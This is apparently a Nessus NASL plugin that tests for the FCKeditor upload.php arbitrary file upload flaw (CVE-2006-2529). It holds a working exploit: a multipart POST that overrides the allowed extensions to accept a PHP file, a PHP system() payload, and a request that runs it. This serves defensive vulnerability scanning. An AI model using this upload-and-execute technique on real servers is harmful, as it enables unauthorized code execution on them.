#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21573);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-2529");
  script_bugtraq_id(18029);
  script_xref(name:"OSVDB", value:"25631");

  script_name(english:"FCKeditor upload.php Type Variable Arbitrary File Upload");
  script_summary(english:"Tries to use upload a file with PHP code using FCKeditor");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of FCKeditor installed on the remote host allows an
unauthenticated attacker to upload arbitrary files containing, say,
PHP code, and then to execute them subject to the privileges of the
web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.fckeditor.net/whatsnew/default.html" );
 script_set_attribute(attribute:"solution", value:
"Either edit 'editor/filemanager/upload/php/config.php' to disable file
uploads or upgrade to FCKeditor 2.3beta or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/fckeditor", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/editor/filemanager/upload/php/upload.php");
  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(0);
  res = w[2];

  # If it does and is not disabled...
  if ("OnUploadCompleted" >< res && "file uploader is disabled" >!< res)
  {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php");
    type = string("nessus-", unixtime());

    bound = "nessus";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="NewFile"; filename="', fname, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      '<?php system(', cmd, ");  ?>\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="Config[AllowedExtensions][', type, '][0]"', "\r\n",
      "\r\n",
      "php\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );

    w = http_send_recv3(method:"POST", port: port, 
      item: strcat(url, "?Type=", type), 
      content_type: "multipart/form-data; boundary="+bound,
      data: postdata);
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    pat = string('OnUploadCompleted\\(0,"([^"]+/', fname, ')');
    url2 = NULL;
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches, keep:FALSE)) {
        url2 = eregmatch(pattern:pat, string:match);
        if (!isnull(url2)) {
          url2 = url2[1];
          break;
        }
      }
    }
    if (isnull(url2)) exit(0);

    # Now try to execute the script.
    w = http_send_recv3(method:"GET", item:url2, port:port);
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];
    
    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    )
    {
      if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          res
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
